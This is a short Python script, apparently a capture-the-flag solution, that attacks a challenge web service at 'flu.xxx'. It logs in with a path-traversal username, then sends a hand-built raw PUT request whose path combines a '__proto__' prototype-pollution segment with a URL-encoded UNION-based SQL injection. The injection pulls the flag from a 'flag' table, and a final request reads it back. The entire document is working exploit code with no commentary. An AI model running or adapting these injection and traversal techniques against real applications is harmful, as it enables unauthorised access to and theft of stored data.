import requests
import random
import socket
import time
from urllib.parse import quote

host = "flu.xxx"
port = 20035
url = f"http://{host}:{port}"

s = requests.session()
headers = {}

# login
r = s.post(url + "/api/auth/login", json={
    "username": "::txId/../../../../health#",
    "password": "123"
})
print(r.text)
if r.status_code == 200:
    token = r.json()['token']
    headers = {
        "authorization": token
    }

randNum = str(random.randint(1, 1000000))
payload = "a') union select " + randNum + ",'byc_404',3,(select flag from flag)-- "
payload = quote(payload)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))
sock.send(f"""PUT http://{host}:{port}/api/priv/assets/__proto__/{payload} HTTP/1.1
HOST: http://{host}:{port}
Authorization: {headers['authorization']}

""".encode())
time.sleep(1)
print(sock.recv(2048))


r = s.get(url + "/api/transactions/" + randNum, headers=headers)
print(r.text)